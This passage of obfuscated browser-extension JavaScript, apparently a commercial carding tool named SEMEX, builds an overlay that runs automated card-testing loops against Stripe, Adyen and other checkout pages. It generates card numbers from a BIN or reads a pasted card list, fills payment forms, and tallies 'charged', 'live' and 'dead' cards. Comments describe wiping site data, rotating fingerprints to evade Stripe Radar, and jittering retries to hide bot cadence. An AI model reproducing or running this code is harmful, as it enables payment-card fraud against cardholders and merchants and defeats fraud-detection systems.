    _0x4fac23.innerHTML = "\n        <!-- PILL (Minimized) -->\n        <div class=\"overlay-pill\">\n            <div class=\"pill-logo\">\n                <span class=\"logo-letter\">S</span>\n            </div>\n            <div class=\"pill-status\">\n                <div class=\"pill-dot\" id=\"pillDot\"></div>\n                <span class=\"pill-text\" id=\"pillText\">Ready</span>\n            </div>\n            <div class=\"pill-btns\">\n                <button class=\"pill-btn play\" id=\"pillPlay\" title=\"Start\">▶</button>\n                <button class=\"pill-btn pause\" id=\"pillPause\" title=\"Pause\">⏸</button>\n                <button class=\"pill-btn stop\" id=\"pillStop\" title=\"Stop\">⏹</button>\n                <button class=\"pill-btn expand\" id=\"pillExpand\" title=\"Expand\">⤢</button>\n            </div>\n        </div>\n\n        <!-- FULL (Maximized) -->\n        <div class=\"overlay-full\" id=\"overlayFull\">\n            <div class=\"full-header\">\n                <div class=\"full-brand\">\n                    <div class=\"full-brand-logo\">\n                        <span class=\"logo-letter\">S</span>\n                    </div>\n                    <div class=\"full-brand-text\">\n                        <span class=\"full-brand-name\">SEMEX</span>\n                        <span class=\"full-brand-tag\">Automation</span>\n                    </div>\n                </div>\n                <div class=\"header-btns\">\n                    <button class=\"header-btn\" id=\"btnPosition\" title=\"Change Position\">📍</button>\n                    <button class=\"header-btn\" id=\"btnDock\" title=\"Dock to Edge\">▤</button>\n                    <button class=\"header-btn\" id=\"btnMinimize\" title=\"Minimize\">−</button>\n                </div>\n            </div>\n            <div class=\"full-body\">\n                <div class=\"full-status\">\n                    <span class=\"full-status-icon\" id=\"statusIcon\">🔄</span>\n                    <span class=\"full-status-text\" id=\"statusText\">Ready</span>\n                </div>\n\n                <div class=\"full-stats\">\n                    <button class=\"stats-toggle\" id=\"statsToggle\" title=\"Toggle Stats Mode\">🔄</button>\n                    <div class=\"stat-item\">\n                        <span class=\"stat-label\">Attempts</span>\n                        <span class=\"stat-value\" id=\"statTotal\">0</span>\n                    </div>\n                    <div class=\"stat-div\"></div>\n                    <div class=\"stat-item\">\n                        <span class=\"stat-label\">Charged</span>\n                        <span class=\"stat-value charged\" id=\"statCharged\">0</span>\n                    </div>\n                    <div class=\"stat-div\"></div>\n                    <div class=\"stat-item\">\n                        <span class=\"stat-label\">Live</span>\n                        <span class=\"stat-value live\" id=\"statLive\">0</span>\n                    </div>\n                    <div class=\"stat-div\"></div>\n                    <div class=\"stat-item\">\n                        <span class=\"stat-label\">Dead</span>\n                        <span class=\"stat-value dead\" id=\"statDead\">0</span>\n                    </div>\n                </div>\n\n                <div class=\"full-details\">\n                    <div class=\"detail-row\">\n                        <span>Card:</span>\n                        <span class=\"detail-val\" id=\"detailCard\">-</span>\n                    </div>\n                    <div class=\"detail-row\">\n                        <span>Attempts:</span>\n                        <span class=\"detail-val\" id=\"detailProcessed\">0</span>\n                    </div>\n                    <div class=\"detail-row\">\n                        <span>Speed:</span>\n                        <span class=\"detail-val\" id=\"detailSpeed\">-</span>\n                    </div>\n                    <div class=\"detail-row\">\n                        <span>Time:</span>\n                        <span class=\"detail-val\" id=\"detailTime\">00:00</span>\n                    </div>\n                </div>\n\n                <div class=\"full-controls\">\n                    <button class=\"ctrl-btn start\" id=\"ctrlStart\">▶ Start</button>\n                    <button class=\"ctrl-btn pause\" id=\"ctrlPause\">⏸ Pause</button>\n                    <button class=\"ctrl-btn stop\" id=\"ctrlStop\">⏹</button>\n                    <button class=\"ctrl-btn blur\" id=\"ctrlBlur\">🔒</button>\n                </div>\n            </div>\n        </div>\n\n        <!-- DOCK (Edge Strip) -->\n        <div class=\"overlay-dock\" id=\"overlayDock\">\n            <div class=\"dock-logo\">\n                <span class=\"logo-letter\">S</span>\n            </div>\n            <div class=\"dock-dot\" id=\"dockDot\"></div>\n            <div class=\"dock-text\" id=\"dockText\">Ready</div>\n        </div>\n    ";
    // Swap the "S" letter tiles for the real brand logo image. Ask the
    // isolated-world bridge for the canonical asset URL (chrome.* is not
    // reachable from MAIN), and try the local derivation immediately.
    try { _0xapplyLogo(_0x12278d()); } catch (_0xlogoErr) {}
    try { window.postMessage({ type: "SEMEX_GET_LOGO_URL" }, "*"); } catch (_0xlogoReq) {}
    if (!_0x335b44) document.body.appendChild(_0x4fac23);
    _0x1ed99e();
    _0x2c3b73();
    // Restore persisted stats so a page refresh doesn't blank the panel.
    try { window.postMessage({ type: "SEMEX_GET_GLOBAL_STATS" }, "*"); } catch (_0xgsErr) {}
  }
  __name(_0x1e815c, "createSemexOverlay");
  function _0x1ed99e() {
    var _0x20580b;
    var _0x1eb50d;
    var _0xfc84b9;
    var _0x5cca95;
    var _0x59c45f;
    var _0x55e124;
    var _0x179782;
    var _0x56b64a;
    var _0x4c58b7;
    var _0x3ae10e;
    var _0x970202;
    var _0x44a95b;
    var _0x476530;
    var _0x4d8071;
    if ((_0x20580b = document.querySelector(".overlay-pill")) == null) {
      undefined;
    } else {
      _0x20580b.addEventListener("click", _0x5ea30e => {
        if (_0x5ea30e.target.closest(".pill-btns")) {
          return;
        }
        _0x249de1("full");
      });
    }
    if ((_0x1eb50d = document.getElementById("pillPlay")) == null) {
      undefined;
    } else {
      _0x1eb50d.addEventListener("click", _0x16bdc4 => {
        _0x16bdc4.stopPropagation();
        _0x3ba8fe();
      });
    }
    if ((_0xfc84b9 = document.getElementById("pillPause")) == null) {
      undefined;
    } else {
      _0xfc84b9.addEventListener("click", _0x5b2a54 => {
        _0x5b2a54.stopPropagation();
        _0x33d51e();
      });
    }
    if ((_0x5cca95 = document.getElementById("pillStop")) == null) {
      undefined;
    } else {
      _0x5cca95.addEventListener("click", _0x3f02ba => {
        _0x3f02ba.stopPropagation();
        _0x158bbc();
      });
    }
    if ((_0x59c45f = document.getElementById("pillExpand")) == null) {
      undefined;
    } else {
      _0x59c45f.addEventListener("click", _0x3608e8 => {
        _0x3608e8.stopPropagation();
        _0x249de1("full");
      });
    }
    if ((_0x55e124 = document.getElementById("btnPosition")) == null) {
      undefined;
    } else {
      _0x55e124.addEventListener("click", _0xead1f3);
    }
    if ((_0x179782 = document.getElementById("btnDock")) == null) {
      undefined;
    } else {
      _0x179782.addEventListener("click", () => _0x249de1("dock"));
    }
    if ((_0x56b64a = document.getElementById("btnMinimize")) == null) {
      undefined;
    } else {
      _0x56b64a.addEventListener("click", () => _0x249de1("pill"));
    }
    if ((_0x4c58b7 = document.getElementById("statsToggle")) == null) {
      undefined;
    } else {
      _0x4c58b7.addEventListener("click", _0x4b524f);
    }
    if ((_0x3ae10e = document.getElementById("ctrlStart")) == null) {
      undefined;
    } else {
      _0x3ae10e.addEventListener("click", _0x3ba8fe);
    }
    if ((_0x970202 = document.getElementById("ctrlPause")) == null) {
      undefined;
    } else {
      _0x970202.addEventListener("click", _0x33d51e);
    }
    if ((_0x44a95b = document.getElementById("ctrlStop")) == null) {
      undefined;
    } else {
      _0x44a95b.addEventListener("click", _0x158bbc);
    }
    if ((_0x476530 = document.getElementById("ctrlBlur")) == null) {
      undefined;
    } else {
      _0x476530.addEventListener("click", _0x2a586a);
    }
    if ((_0x4d8071 = document.getElementById("overlayDock")) == null) {
      undefined;
    } else {
      _0x4d8071.addEventListener("click", () => _0x249de1("full"));
    }
    try { _semexEnsureBinSwitcher(); } catch (_0xbinErr) {}
    try { _semexEnsureDetailRows(); } catch (_0xrowErr) {}
    window.addEventListener("message", _0x28844f);
  }
  __name(_0x1ed99e, "setupEventListeners");
  function _0x249de1(_0x5d6212) {
    _0x5695ac.viewState = _0x5d6212;
    const _0xde53b7 = document.getElementById("semex-overlay");
    if (_0xde53b7) {
      _0xde53b7.className = _0xde53b7.className.replace(/state-\w+/g, "");
      _0xde53b7.classList.add("state-" + _0x5d6212);
    }
    _0x512105();
  }
  __name(_0x249de1, "setViewState");
  function _0xead1f3() {
    const _0x5837af = _0x3b42e1.positions.indexOf(_0x5695ac.position);
    _0x5695ac.position = _0x3b42e1.positions[(_0x5837af + 1) % 4];
    const _0x24cc5b = document.getElementById("semex-overlay");
    if (_0x24cc5b) {
      _0x24cc5b.className = _0x24cc5b.className.replace(/pos-\w+/g, "");
      _0x24cc5b.classList.add("pos-" + _0x5695ac.position);
    }
    _0x512105();
  }
  __name(_0xead1f3, "cyclePosition");
  function _0x4b524f() {
    _0x5695ac.statsMode = _0x5695ac.statsMode === "session" ? "global" : "session";
    _0xba4edd();
    _0x512105();
  }
  __name(_0x4b524f, "toggleStatsMode");
  function _0x2a586a() {
    _0x5695ac.isBlurred = !_0x5695ac.isBlurred;
    const _0x2aad62 = document.getElementById("ctrlBlur");
    // v4.0: Hide masks the Card, BIN and IP detail values (user request).
    ["detailCard", "detailBinInfo", "detailIp"].forEach(_0xid => {
      const _0xnode = document.getElementById(_0xid);
      if (_0xnode) _0xnode.style.filter = _0x5695ac.isBlurred ? "blur(4px)" : "none";
    });
    // Hide/show also collapses the whole checkout-details block (type, card,
    // attempts, time, BIN, IP) — not just blurring three values.
    const _0xovrRoot = document.getElementById("semex-overlay");
    if (_0xovrRoot) _0xovrRoot.classList.toggle("details-hidden", _0x5695ac.isBlurred);
    if (_0x2aad62) {
      _0x2aad62.textContent = _0x5695ac.isBlurred ? "👁️" : "🔒";
      _0x2aad62.title = _0x5695ac.isBlurred ? "Show hidden details" : "Hide card / BIN / IP";
    }
    _0x27ae9(_0x5695ac.isBlurred);
  }
  __name(_0x2a586a, "toggleBlur");
  function _0x512105() {
    try {
      localStorage.setItem("semex_overlay_state", JSON.stringify({
        position: _0x5695ac.position,
        viewState: _0x5695ac.viewState,
        statsMode: _0x5695ac.statsMode
      }));
    } catch (_0x14c425) {}
  }
  __name(_0x512105, "saveState");
  function _0x2c3b73() {
    try {
      const _0xf1b699 = localStorage.getItem("semex_overlay_state");
      if (_0xf1b699) {
        const _0x122fb0 = JSON.parse(_0xf1b699);
        if (_0x122fb0.position) {
          _0x5695ac.position = _0x122fb0.position;
        }
        if (_0x122fb0.viewState) {
          _0x5695ac.viewState = _0x122fb0.viewState;
        }
        if (_0x122fb0.statsMode) {
          _0x5695ac.statsMode = _0x122fb0.statsMode;
        }
        const _0x21d0f8 = document.getElementById("semex-overlay");
        if (_0x21d0f8) {
          _0x21d0f8.className = "state-" + _0x5695ac.viewState + " pos-" + _0x5695ac.position;
        }
      }
    } catch (_0x42057d) {}
  }
  __name(_0x2c3b73, "loadSavedState");
  function _0x2796fd(_0x1d7e3f, _0x389732 = "🔄") {
    var _0x21ade3;
    var _0x304639;
    const _0x2d56a3 = document.getElementById("statusText");
    const _0xf88fc4 = document.getElementById("statusIcon");
    const _0x547e54 = document.getElementById("pillText");
    const _0xcdc7d7 = document.getElementById("dockText");
    if (_0x2d56a3) {
      _0x2d56a3.textContent = _0x1d7e3f;
    }
    if (_0xf88fc4) {
      _0xf88fc4.textContent = _0x389732;
    }
    if (_0x547e54) {
      _0x547e54.textContent = _0x389732 + " " + _0x1d7e3f;
    }
    if (_0xcdc7d7) {
      _0xcdc7d7.textContent = _0x1d7e3f.substring(0, 10);
    }
    const _0x47cc45 = _0x1d7e3f.includes("CHARGED") ? "charged" : _0x1d7e3f.includes("LIVE") ? "live" : _0x1d7e3f.includes("DEAD") ? "dead" : "processing";
    if ((_0x21ade3 = document.getElementById("pillDot")) == null) {
      undefined;
    } else {
      _0x21ade3.setAttribute("class", "pill-dot " + _0x47cc45);
    }
    if ((_0x304639 = document.getElementById("dockDot")) == null) {
      undefined;
    } else {
      _0x304639.setAttribute("class", "dock-dot " + _0x47cc45);
    }
  }
  __name(_0x2796fd, "setStatus");
  function _0x5e14b2(_0x55cd9d) {
    if (!_0x55cd9d) {
      return;
    }
    const _0x5f5b13 = _0x55cd9d.number ? _0x55cd9d.number.slice(0, 4) + "****" + _0x55cd9d.number.slice(-4) : "-";
    const _0xc8fca2 = document.getElementById("detailCard");
    if (_0xc8fca2) {
      _0xc8fca2.textContent = _0x5f5b13;
    }
    _0x5695ac.currentCard = _0x55cd9d;
    try { _semexLookupBin(_0x55cd9d.number); } catch (_0xbinErr) {}
  }
  __name(_0x5e14b2, "setCardDisplay");
  function _0xba4edd() {
    if (_0x5695ac.statsMode === "global") {
      _0x5492d8();
    } else {
      const _0x28c8d8 = document.getElementById("statTotal");
      const _0x248fb4 = document.getElementById("statCharged");
      const _0xa15c3 = document.getElementById("statLive");
      const _0x2871c3 = document.getElementById("statDead");
      if (_0x28c8d8) {
        _0x28c8d8.textContent = _0x5695ac.sessionStats.total;
      }
      if (_0x248fb4) {
        _0x248fb4.textContent = _0x5695ac.sessionStats.charged;
      }
      if (_0xa15c3) {
        _0xa15c3.textContent = _0x5695ac.sessionStats.live;
      }
      if (_0x2871c3) {
        _0x2871c3.textContent = _0x5695ac.sessionStats.dead;
      }
    }
    const _0x162f55 = document.getElementById("statsToggle");
    if (_0x162f55) {
      _0x162f55.textContent = _0x5695ac.statsMode === "global" ? "🌐" : "📊";
      _0x162f55.title = _0x5695ac.statsMode === "global" ? "Showing Global Stats" : "Showing Session Stats";
    }
  }
  __name(_0xba4edd, "updateStatsDisplay");
  function _0x5492d8() {
    window.postMessage({
      type: "SEMEX_GET_GLOBAL_STATS"
    }, "*");
  }
  __name(_0x5492d8, "loadGlobalStats");
  function _0x4d4a59() {
    const _0x3660bd = document.getElementById("detailProcessed");
    if (_0x3660bd) {
      _0x3660bd.textContent = _0x5695ac.processedCount;
    }
  }
  __name(_0x4d4a59, "updateProcessedCount");
  function _0x38fd69() {
    if (!_0x5695ac.startTime || _0x5695ac.processedCount === 0) {
      return;
    }
    const _0x562323 = (Date.now() - _0x5695ac.startTime) / 60000;
    const _0x1cf756 = _0x562323 > 0 ? (_0x5695ac.processedCount / _0x562323).toFixed(1) : "-";
    const _0x7c8b3e = document.getElementById("detailSpeed");
    if (_0x7c8b3e) {
      _0x7c8b3e.textContent = _0x1cf756 + " cards/min";
    }
  }
  __name(_0x38fd69, "updateSpeed");
  function _0xaf135e() {
    const _0xab927c = _0x5695ac.isRunning;
    const _0x2fba39 = _0x5695ac.isPaused;
    document.getElementById("ctrlStart").style.display = _0xab927c && !_0x2fba39 ? "none" : "flex";
    document.getElementById("ctrlPause").style.display = _0xab927c && !_0x2fba39 ? "flex" : "none";
    document.getElementById("ctrlStart").textContent = _0x2fba39 ? "▶ Resume" : "▶ Start";
    document.getElementById("pillPlay").style.display = _0xab927c && !_0x2fba39 ? "none" : "flex";
    document.getElementById("pillPause").style.display = _0xab927c && !_0x2fba39 ? "flex" : "none";
  }
  __name(_0xaf135e, "updateControls");
  function _0x564f62() {
    _0x5695ac.startTime = Date.now();
    _0x5695ac.timerInterval = setInterval(() => {
      const _0x3a679c = Math.floor((Date.now() - _0x5695ac.startTime) / 1000);
      const _0x1e4a17 = Math.floor(_0x3a679c / 60);
      const _0x3754b7 = _0x3a679c % 60;
      const _0x918fe3 = document.getElementById("detailTime");
      if (_0x918fe3) {
        _0x918fe3.textContent = String(_0x1e4a17).padStart(2, "0") + ":" + String(_0x3754b7).padStart(2, "0");
      }
      _0x38fd69();
    }, 1000);
  }
  __name(_0x564f62, "startTimer");
  function _0x42fbdc() {
    if (_0x5695ac.timerInterval) {
      clearInterval(_0x5695ac.timerInterval);
      _0x5695ac.timerInterval = null;
    }
  }
  __name(_0x42fbdc, "stopTimer");
  async function _0x378da() {
    var _0xbaed0f;
    const _0x5f58a4 = window.__extensionSettings || {};
    const _0x1ad58c = _0x5f58a4.binOrCCList || {};
    const _0x509f2b = (_0xbaed0f = _0x5f58a4.cardReplacement) == null ? undefined : _0xbaed0f.enabled;
    // Per-gateway gate: the Card Replacement checkbox for THIS page's gateway
    // (Stripe / Adyen / Checkout / Recurly / Xsolla) must also be on.
    const _semexGwKey = _semexGatewayKey() || "stripe";
    const _semexGwOk = !(_0x5f58a4.cardReplacement && _0x5f58a4.cardReplacement.gateways && _0x5f58a4.cardReplacement.gateways[_semexGwKey] === false);
    if (!_0x509f2b || !_semexGwOk) {
      _0x2796fd("Enable Card Replacement (" + _semexGwKey.toUpperCase() + ")!", "⚠️");
      return false;
    }
    const _0x2c5ca4 = _0x1ad58c.mode || "bin";
    if (_0x2c5ca4 === "bin") {
      const _0x381303 = (_0x1ad58c.bin || "").trim();
      if (!_0x381303 || _0x381303.length < 6) {
        _0x2796fd("Enter BIN first!", "⚠️");
        return false;
      }
    } else {
      const _0x33d1dc = _0x1ad58c.ccList || "";
      if (!_0x33d1dc || _0x33d1dc.length < 10) {
        _0x2796fd("Add Cards first!", "⚠️");
        return false;
      }
    }
    // Access gate: expired / non-subscribed users (non-admin) must redeem a code
    // before they can run. Admins/owners always pass. Network errors don't block.
    try {
      const _semexAccess = await new Promise((_res) => {
        try {
          chrome.runtime.sendMessage({ type: "VERIFY_SESSION" }, (r) => { _res(r || {}); });
        } catch (e) { _res({}); }
      });
      if (_semexAccess && _semexAccess.valid === true && _semexAccess.isAdmin !== true && _semexAccess.hasAccess === false) {
        _0x2796fd("Access expired — redeem a code", "🔒");
        return false;
      }
    } catch (e) {}

    if (_0x3e38bb && Date.now() - _0x3e38bb < _0x50a089 && !_0x2cef3e) {
      _0x2796fd("Invoice Expired!", "⚠️");
      return false;
    }
    if (_0x454948 && Date.now() - _0x454948 < _0x50a089 && !_0x2d0e41) {
      _0x2796fd("Already Active!", "✅");
      return false;
    }
    const _0x4f13c0 = document.body.innerText.toLowerCase();
    if (_0x4f13c0.includes("invoice is expired") || _0x4f13c0.includes("subscription expired") || _0x4f13c0.includes("this link has expired") || _0x4f13c0.includes("link is no longer valid") || _0x4f13c0.includes("session has expired") || _0x4f13c0.includes("payment link expired") || _0x4f13c0.includes("you're all done here") || _0x4f13c0.includes("you are all done here") || _0x4f13c0.includes("checkout session has timed out") || _0x4f13c0.includes("completed your payment") || _0x4f13c0.includes("already been paid") || document.querySelector(".subscription-expired-message")) {
      _0x2796fd("Invoice Expired!", "⚠️");
      return false;
    }
    if (_0x4f13c0.includes("already subscribed") || _0x4f13c0.includes("current plan")) {
      _0x2796fd("Already Active!", "✅");
      return false;
    }
    return true;
  }
  __name(_0x378da, "performPreStartChecks");
  async function _0x3ba8fe() {
    if (_0x5695ac.isRunning && !_0x5695ac.isPaused) {
      return;
    }
    // Resume FIRST: a paused session already passed pre-start checks when it
    // started. Re-running them here could leave the session stuck in "Paused"
    // with no feedback if any gate flips mid-run (invoice TTL, page text, etc).
    if (_0x5695ac.isPaused) {
      _0x5695ac.isPaused = false;
      _0x2796fd("Resuming...", "▶");
      _0xaf135e();
      return;
    }
    if (!(await _0x378da())) {
      return;
    }
    _0x5695ac.isRunning = true;
    _0x5695ac.isPaused = false;
    _0x5695ac.processedCount = 0;
    _0x5695ac.sessionStats = {
      total: 0,
      charged: 0,
      live: 0,
      dead: 0
    };
    _0xaf135e();
    _0x564f62();

    // SEMEX pre-run: clear the checkout origin's cookies + storage AND rotate
    // the anti-fingerprint identity so this session looks like a fresh device.
    // Both are gated by user settings; failure never blocks the run.
    try {
      const _s = window.__extensionSettings || {};
      if (_s.antiFingerprintAutoClear !== false) {
        _0x2796fd("Wiping site data...", "🧹");
        await new Promise((resolve) => {
          const onRes = (ev) => {
            if (ev && ev.data && ev.data.type === "SEMEX_CLEAR_CHECKOUT_DATA_RES") {
              window.removeEventListener("message", onRes);
              resolve();
            }
          };
          window.addEventListener("message", onRes);
          try { window.postMessage({ type: "SEMEX_CLEAR_CHECKOUT_DATA_REQ", origin: window.location.origin }, "*"); } catch (e) {}
          setTimeout(() => { window.removeEventListener("message", onRes); resolve(); }, 3000);
        });
      }
      if (_s.antiFingerprintBumpOnStart !== false) {
        try { window.postMessage({ __semex: "af", type: "bump" }, "*"); } catch (e) {}
      }
    } catch (e) { /* never block Start on prep errors */ }

    _0x2796fd("Running", "▶");
    // SEMEX: gateway bypass toast — fires once on Start so the user gets
    // immediate feedback before the first form-fill attempt.
    try {
      const _semexGwLabel = (function() {
        const _h = (window.location.hostname || "").toLowerCase();
        if (_h.includes("stripe.com")) return "Stripe";
        if (_h.includes("adyen") || document.querySelector("iframe[src*='adyen']")) return "Adyen";
        return "Checkout";
      })();
      // Call showToast directly in MAIN world — the old postMessage went nowhere
      // because no listener handles SEMEX_TOAST. This gives the competitor-style
      // "STRIPE Bypass · SECURITY" toast the moment automation starts.
      if (typeof window.showToast === "function") {
        window.showToast({ messageType: "BYPASS_ACTIVATED", gateway: _semexGwLabel, bypassTypes: ["SECURITY"] });
      }
    } catch (_semexToastErr) {}
    try { _semexFetchIp(); } catch (_0xipErr) {}
    try {
      await _0x28df69();
    } catch (_loopErr) {
      // Surface loop failures instead of dying silently (was an unhandled
      // rejection — looked like the session "stopped itself").
      try { _0x2796fd("Error: " + ((_loopErr && _loopErr.message) || "automation loop failed"), "⚠️"); } catch (e) {}
      _0x158bbc();
    }
  }
  __name(_0x3ba8fe, "startAutomation");
  function _0x33d51e() {
    _0x5695ac.isPaused = true;
    _0x2796fd("Paused", "⏸");
    _0xaf135e();
  }
  __name(_0x33d51e, "pauseAutomation");
  function _0x158bbc() {
    _0x5695ac.isRunning = false;
    _0x5695ac.isPaused = false;
    window.__SEMEX_LOOP_ID = null;
    _0x42fbdc();
    _0x2796fd("Stopped", "⏹");
    _0xaf135e();
  }
  __name(_0x158bbc, "stopAutomation");
  async function _0x28df69() {
    var _0x3b0108;
    let _0x26238b = 0;
    const _0x254b52 = 30000;
    while (_0x5695ac.isRunning) {
      while (_0x5695ac.isPaused && _0x5695ac.isRunning) {
        await _0x1db10a(500);
      }
      if (!_0x5695ac.isRunning) {
        break;
      }
      try {
        // JetX-legacy subscription "premium" heartbeat lock removed per request.
        // Access control is enforced server-side (expired users get 402 on
        // hit submission), so no client-side lock overlay is needed here.
        window.__SEMEX_LOOP_ID = Date.now();
        _0x5695ac.processedCount++;
        _0x4d4a59();
        _0x37b373 = new Promise(_0xb17436 => {
          _0x1ff268 = _0xb17436;
        });
        const _0x137287 = window.__extensionSettings || {};
        const _0x650755 = _0x137287.binOrCCList || {};
        const _0x118979 = _0x650755.mode || "bin";
        if (_0x118979 === "ccList") {
          const _0x56a9b2 = _0x650755.ccList || "";
          if (!_0x56a9b2 || _0x56a9b2.trim().length < 10) {
            _0x2796fd("No cards left!", "⚠️");
            _0x158bbc();
            break;
          }
        }
        if (_0x3e38bb && Date.now() - _0x3e38bb < _0x50a089 && !_0x2cef3e) {
          _0x2796fd("Invoice Expired!", "⚠️");
          _0x158bbc();
          break;
        }
        if (_0x454948 && Date.now() - _0x454948 < SUBSCRIPTION_CHECK_WINDOW && !_0x2d0e41) {
          _0x2796fd("Has Active Subscription!", "⚠️");
          _0x158bbc();
          break;
        }
        // Pick/generate THIS attempt's card up front and hand it to the fill.
        // Previously currentCard was only set by async CARD_REPLACED traffic,
        // so a fresh Start had no card to fill with (PC symptom: nothing
        // filled, or the old test-card fallback kicked in).
        const _0xnextCard = await _0x2f8a1d();
        if (!_0xnextCard) {
          _0x2796fd("No card — check BIN/CC list", "⚠️");
          _0x158bbc();
          break;
        }
        _0x5e14b2(_0xnextCard);
        _0x2796fd("Filling form...", "📝");
        await _0x4e97c4();
        await _0x1db10a(_0x3b42e1.timing.submitWait);
        _0x2796fd("Waiting response...", "⏳");
        const _0x445f90 = await Promise.race([_0x37b373, new Promise(_0x2e53c6 => setTimeout(() => _0x2e53c6("TIMEOUT"), _0x3b42e1.timing.statusTimeout))]);
        await _0x5972a0(_0x445f90, _0x5695ac.currentCard);
        if (_0x445f90 === "CHARGED" || _0x445f90 === "EXPIRED" || _0x445f90 === "HAS_ACTIVE_SUBSCRIPTION") {
          _0x158bbc();
          break;
        }
        // Between-attempt: bump the anti-fingerprint seed so the next attempt
        // presents as a different "device" to Radar, and apply randomised jitter
        // to the retry delay so the cadence isn't a bot signature.
        try {
          const _s = window.__extensionSettings || {};
          if (_s.antiFingerprintBumpEachAttempt !== false) {
            window.postMessage({ __semex: "af", type: "bump" }, "*");
          }
          const jitterEnabled = _s.retryJitterEnabled !== false;
          const jMin = Math.max(0, Number(_s.retryJitterMinMs) || 2000);
          const jMax = Math.max(jMin + 1, Number(_s.retryJitterMaxMs) || 9000);
          const dly = jitterEnabled
            ? Math.floor(jMin + Math.random() * (jMax - jMin))
            : _0x3b42e1.timing.errorDelay;
          await _0x1db10a(dly);
        } catch (e) {
          await _0x1db10a(_0x3b42e1.timing.errorDelay);
        }
      } catch (_0xe709d) {
        if ((_0x3b0108 = _0xe709d.message) == null ? undefined : _0x3b0108.includes("Extension context invalidated")) {
          _0x3dc17d("Extension reloaded");
          _0x158bbc();
          break;
        }
        _0x2796fd("Error: " + _0xe709d.message, "❌");
        await _0x1db10a(_0x3b42e1.timing.errorDelay);
      }
    }
  }
  __name(_0x28df69, "runAutomationLoop");
  async function _0x9b4cc5() {
    return new Promise(_0x52f9da => {
      const _0x720bf1 = setTimeout(() => {
        window.removeEventListener("message", _0xe26824);
        _0x52f9da(false);
      }, 5000);
      const _0xe26824 = __name(_0x1c26ec => {
        var _0x5516fb;
        if (((_0x5516fb = _0x1c26ec.data) == null ? undefined : _0x5516fb.type) === "SEMEX_SUBSCRIPTION_STATUS") {
          clearTimeout(_0x720bf1);
          window.removeEventListener("message", _0xe26824);
          _0x52f9da(_0x1c26ec.data.valid === true);
        }
      }, "handler");
      window.addEventListener("message", _0xe26824);
      window.postMessage({
        type: "SEMEX_CHECK_SUBSCRIPTION"
      }, "*");
    });
  }
  __name(_0x9b4cc5, "checkSubscriptionHeartbeat");
  function _0x3dc17d(_0x24bd12 = "Subscription expired") {
    const _0x3f7b01 = document.getElementById("semex-lock-overlay");
    if (_0x3f7b01) {
      _0x3f7b01.remove();
    }
    const _0x3376fa = document.createElement("div");
    _0x3376fa.id = "semex-lock-overlay";
    _0x3376fa.innerHTML = "\n            <div style=\"\n                position: fixed;\n                inset: 0;\n                background: rgba(0, 0, 0, 0.9);\n                z-index: 2147483647;\n                display: flex;\n                flex-direction: column;\n                align-items: center;\n                justify-content: center;\n                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;\n                color: white;\n            \">\n                <div style=\"font-size: 64px; margin-bottom: 20px;\">🔒</div>\n                <h1 style=\"font-size: 28px; margin: 0 0 10px;\">SEMEX</h1>\n                <p style=\"font-size: 16px; color: #ff6b6b; margin: 0 0 20px;\">" + _0x24bd12 + "</p>\n                <p style=\"font-size: 14px; color: #888; margin: 0;\">Please check your subscription status</p>\n            </div>\n        ";
    document.body.appendChild(_0x3376fa);
  }
  __name(_0x3dc17d, "showSubscriptionLockOverlay");
  async function _0x9de599() {
    const _0xa104ea = window.__extensionSettings || {};
    const _0xfa053a = _0xa104ea.binOrCCList || {};
    const _0x27ced3 = _0xfa053a.mode || "bin";
    if (_0x27ced3 === "bin") {
      const _0x584f17 = (_0xfa053a.bin || "").trim();
      if (!_0x584f17 || _0x584f17.length < 6) {
        return null;
      }
      if (typeof window.CardGenerator === "undefined") {
        return null;
      }
      const _0x54f836 = _0x584f17.replace(/\D/g, "");
      const _0x3adb91 = _0x54f836.startsWith("34") || _0x54f836.startsWith("37");
      const _0x1203c9 = _0x3adb91 ? 15 : 16;
      const _0x1ed2d6 = _0xfa053a.expiry || {};
      const _0x27637e = _0x1ed2d6.month || "RND";
      const _0x41e9ec = _0x1ed2d6.year || "RND";
      const _0x5dd26f = window.CardGenerator.generateCard(_0x584f17, _0x1203c9, _0x27637e, _0x41e9ec);
      if (!_0x5dd26f) {
        return null;
      }
      _0x5dd26f.cvv = _0x3adb91 ? String(Math.floor(Math.random() * 9000) + 1000) : String(Math.floor(Math.random() * 900) + 100);
      return _0x5dd26f;
    } else if (_0x27ced3 === "ccList") {
      const _0x484daa = _0xfa053a.ccList || "";
      if (!_0x484daa.trim()) {
        return null;
      }
      if (typeof window.CardList === "undefined" || !window.CardList.CardListManager) {
        return null;
      }
      if (!window.__overlayCardListManager) {
        window.__overlayCardListManager = new window.CardList.CardListManager();
      }
      if (window.__overlayCardListManager.isEmpty() || window.__lastOverlayCCList !== _0x484daa) {
        window.__overlayCardListManager.loadFromText(_0x484daa);
        window.__lastOverlayCCList = _0x484daa;
      }
      const _0x32ce8e = window.__overlayCardListManager.getNextCard();
      if (!_0x32ce8e) {
        return null;
      }
      if (!_0x32ce8e.cvv) {
        const _0x40c88a = _0x32ce8e.number && (_0x32ce8e.number.startsWith("34") || _0x32ce8e.number.startsWith("37"));
        _0x32ce8e.cvv = _0x40c88a ? String(Math.floor(Math.random() * 9000) + 1000) : String(Math.floor(Math.random() * 900) + 100);
      }
      return _0x32ce8e;
    }
    return null;
  }
  __name(_0x9de599, "getNextCard");
  // Ask content.js (which owns settings + CardGenerator) for THIS attempt's
  // card. Resolves with the card object or null (none left / bad BIN / no
  // response within 3s). Previously nothing ever sent SEMEX_GET_NEXT_CARD, so
  // currentCard stayed null on a fresh Start and the fill had nothing to use.
  function _0x2f8a1d() {
    return new Promise(_0xncres => {
      const _0xnch = __name(_0xncev => {
        if (_0xncev.data && _0xncev.data.type === "SEMEX_NEXT_CARD_RESULT") {
          window.removeEventListener("message", _0xnch);
          _0xncres(_0xncev.data.card || null);
        }
      }, "handler");
      window.addEventListener("message", _0xnch);
      setTimeout(() => {
        window.removeEventListener("message", _0xnch);
        _0xncres(null);
      }, 3000);
      window.postMessage({
        type: "SEMEX_GET_NEXT_CARD"
      }, "*");
    });
  }
  __name(_0x2f8a1d, "requestNextCard");
  async function _0x4e97c4() {
    const _0xa35803 = new Promise(_0xd60ef6 => {
      const _0x394c1a = __name(_0x1c8488 => {
        var _0x34089f;
        if (((_0x34089f = _0x1c8488.data) == null ? undefined : _0x34089f.type) === "SEMEX_FILL_FORM_COMPLETE") {
          window.removeEventListener("message", _0x394c1a);
          _0xd60ef6(_0x1c8488.data);
        }
      }, "handler");
